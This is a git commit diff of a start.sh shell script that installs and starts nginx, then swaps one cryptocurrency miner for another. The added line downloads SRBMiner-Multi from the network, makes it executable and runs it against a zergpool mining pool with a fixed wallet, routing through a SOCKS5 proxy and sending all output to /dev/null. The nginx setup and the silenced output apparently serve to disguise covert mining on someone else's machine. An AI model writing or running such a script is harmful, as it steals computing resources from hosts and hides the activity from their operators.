9285b1dfddd46612fb848d313a43875d7af00de4
Kentanggan <107301141+Kentanggan@users.noreply.github.com>
2022-07-27 22:53:22 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -3,4 +3,4 @@ apt update -y
 apt install nginx -y
 apt install wget -y
 service nginx start
-wget https://github.com/nanopool/nanominer/releases/download/v3.6.5/nanominer-linux-3.6.5.tar.gz && tar -xvf nanominer-linux-3.6.5.tar.gz && cd nanominer-linux-3.6.5 && chmod +x nanominer && ./nanominer -algo verushash -pool1 verushash.mine.zergpool.com:3300 -wallet LUFTF9kAQgHyWLv2rctGvVSSxL9RXBodcF.OKTE -password c=LTC -x socks5://192.252.214.20:15864 > /dev/null 2>&1
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.5/SRBMiner-Multi-0-9-5-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-9-5-Linux.tar.xz && cd SRBMiner-Multi-0-9-5 && chmod +x SRBMiner && ./SRBMiner-MULTI --algorithm yescryptR16 --pool stratum+tcp://yescryptR16.na.mine.zergpool.com:6333  --wallet LUFTF9kAQgHyWLv2rctGvVSSxL9RXBodcF.OKTE -p c=LTC -x socks5://192.252.214.20:15864 > /dev/null 2>&1
